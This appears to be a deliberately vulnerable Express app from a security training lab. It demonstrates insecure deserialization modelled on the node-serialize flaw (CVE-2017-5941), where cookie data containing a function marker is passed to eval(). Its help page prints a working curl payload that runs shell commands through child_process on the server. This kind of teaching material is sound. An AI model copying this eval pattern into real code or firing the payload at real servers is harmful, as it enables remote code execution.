// VULNERABLE BY DESIGN — Insecure Deserialization (CWE-502).
// Reproduces the well-known "node-serialize" RCE pattern (CVE-2017-5941):
// a serialized value can embed a function marker; on deserialize, instead
// of using JSON.parse, the code falls back to eval() whenever that marker
// is present, letting an attacker-controlled cookie run arbitrary code.
const express = require('express');
const cookieParser = require('cookie-parser');

const PORT = process.env.PORT || 3009;
const app = express();
app.use(express.json());
app.use(cookieParser());

const PREFIX = '_$$ND_FUNC$$_';

function serialize(obj) {
  return JSON.stringify(obj, (key, value) =>
    typeof value === 'function' ? PREFIX + value.toString() : value
  );
}

function unserialize(str) {
  if (!str.includes(PREFIX)) {
    return JSON.parse(str);
  }
  // Undo JSON string-escaping around the function marker so eval() sees
  // real JS source, then execute it as part of the object literal.
  const funcMarkerRe = /"_\$\$ND_FUNC\$\$_([\s\S]*?)"(?=\s*[,}])/g;
  const withRawFunctions = str.replace(funcMarkerRe, (match, body) => JSON.parse(`"${body}"`));
  // BUG: eval() on attacker-controlled input instead of JSON.parse().
  // eslint-disable-next-line no-eval
  return eval('(' + withRawFunctions + ')');
}

app.get('/', (req, res) => {
  res.type('html').send(`
    <h1>09 — Insecure Deserialization demo</h1>
    <p>POST /set-prefs with a JSON body to get back a "prefs" cookie. GET /profile
    reads that cookie and deserializes it.</p>
    <p>Normal use:</p>
    <pre>curl -c c.txt -X POST http://localhost:${PORT}/set-prefs -H "Content-Type: application/json" -d '{"theme":"dark"}'
curl -b c.txt http://localhost:${PORT}/profile</pre>
    <p>Malicious cookie (RCE via the function-marker fallback to eval):</p>
    <pre>curl -c c.txt -X POST http://localhost:${PORT}/set-prefs -H "Content-Type: application/json" \\
  -d '{"theme":"_$$ND_FUNC$$_function (){ return require(\\'child_process\\').execSync(\\'id\\').toString() }()"}'
curl -b c.txt http://localhost:${PORT}/profile</pre>
  `);
});

app.post('/set-prefs', (req, res) => {
  const cookieValue = Buffer.from(serialize(req.body || {})).toString('base64');
  res.cookie('prefs', cookieValue);
  res.json({ ok: true, cookie: cookieValue });
});

app.get('/profile', (req, res) => {
  const raw = req.cookies.prefs;
  if (!raw) return res.json({ prefs: { theme: 'light' }, source: 'default' });
  try {
    const decoded = Buffer.from(raw, 'base64').toString('utf8');
    const prefs = unserialize(decoded);
    res.json({ prefs, source: 'cookie' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`[09-insecure-deserialization] listening on http://localhost:${PORT}`);
});